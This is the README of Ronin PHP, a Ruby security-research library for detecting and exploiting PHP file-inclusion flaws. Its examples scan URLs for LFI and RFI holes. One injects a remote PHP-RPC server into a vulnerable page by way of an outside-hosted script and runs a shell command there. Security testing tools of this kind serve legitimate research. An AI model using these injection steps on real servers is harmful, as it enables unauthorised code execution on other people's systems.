# Ronin PHP

* [Source](http://github.com/ronin-ruby/ronin-php)
* [Issues](http://github.com/ronin-ruby/ronin-php/issues)
* [Documentation](http://rubydoc.info/github/ronin-ruby/ronin-php/frames)
* [Mailing List](http://groups.google.com/group/ronin-ruby)
* irc.freenode.net #ronin

## Description

Ronin PHP is a Ruby library for Ronin that provides support for PHP
related security tasks.

Ronin is a Ruby platform for exploit development and security research.
Ronin allows for the rapid development and distribution of code, exploits
or payloads over many common Source-Code-Management (SCM) systems.

### Ruby

Ronin's Ruby environment allows security researchers to leverage Ruby with
ease. The Ruby environment contains a multitude of convenience methods
for working with data in Ruby, a Ruby Object Database, a customized Ruby
Console and an extendable command-line interface.

### Extend

Ronin's more specialized features are provided by additional Ronin
libraries, which users can choose to install. These libraries can allow
one to write and run Exploits and Payloads, scan for PHP vulnerabilities,
perform Google Dorks  or run 3rd party scanners.

### Publish

Ronin allows users to publish and share code, exploits, payloads or other
data via Overlays. Overlays are directories of code and data that can be
hosted on any SVN, Hg, Git or Rsync server. Ronin makes it easy to create,
install or update Overlays.

## Features

* Provides tests for Location File Inclusion (LFI) and Remote File
  Inclusion (RFI) that are built into the URI::HTTP class.
* Allows for effortless finger-printing of a web-server using LFI.
* Provides a PHP-RPC client and server that are designed to work in hostile
  environments.
* Provides an AJAX PHP-RPC Console.

## Synopsis

Start the Ronin console with Ronin PHP preloaded:

    $ ronin-php

## Examples

Test for Remote File Inclusion (RFI):

    require 'ronin/php/rfi'

    url = URI('http://www.example.com/page.php?lang=en')
    url.has_rfi?
    # => true

Get the first viable RFI vulnerability:

    url.first_rfi
    # => #<Ronin::PHP::RFI: ...>

Scan a URL for RFI vulnerabilities:

    url.rfi_scan
    # => [#<Ronin::PHP::RFI: ...>, ...]

Inject a PHP-RPC Server into a RFI vulnerable URL:

    require 'ronin/rpc/php'

    client = url.rfi.rpc
    client.exec('whoami')
    # => "www-data"

Get a direct URL to the AJAX interface of the PHP-RPC Server:

    client.url
    # => "http://www.example.com/page.php?en=http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php?"

Test for Local File Inclusion (LFI):

    require 'ronin/php/lfi'

    url = URI('http://www.example.com/site.php?page=home')
    url.has_lfi?
    # => true

Get the first viable LFI vulnerability:

    url.first_lfi
    # => #<Ronin::PHP::LFI: ...>

Scan a URL for LFI vulnerabilities:

    url.lfi_scan
    # => [#<Ronin::PHP::LFI: ...>, ...]

## Requirements

* [cssmin](http://rubygems.org/gems/cssmin) ~> 1.0.2
* [jsmin](http://rubygems.org/gems/jsmin) ~> 1.0.1
* [ronin-support](http://github.com/ronin-ruby/ronin-support) ~> 0.1.0
* [ronin](http://github.com/ronin-ruby/ronin) ~> 0.4.0
* [ronin-gen](http://github.com/ronin-ruby/ronin-gen) ~> 0.3.0
* [ronin-scanners](http://github.com/ronin-ruby/ronin-scanners) ~> 0.2.0
* [ronin-web](http://github.com/ronin-ruby/ronin-web) ~> 0.3.0
* [ronin-exploits](http://github.com/ronin-ruby/ronin-exploits) ~> 0.4.0

## Install

    $ sudo gem install ronin-php

## License

Ronin PHP - A Ruby library for Ronin that provides support for PHP
related security tasks.

Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
